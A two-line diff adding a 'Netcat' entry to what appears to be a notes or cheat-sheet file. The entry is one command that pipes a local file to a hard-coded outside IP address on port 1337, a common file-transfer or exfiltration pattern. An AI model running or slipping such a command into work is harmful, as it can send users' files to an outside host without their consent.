@@ -1,0 +1,2 @@
+### Netcat
+nc 23.253.112.132 1337 < filename.dat
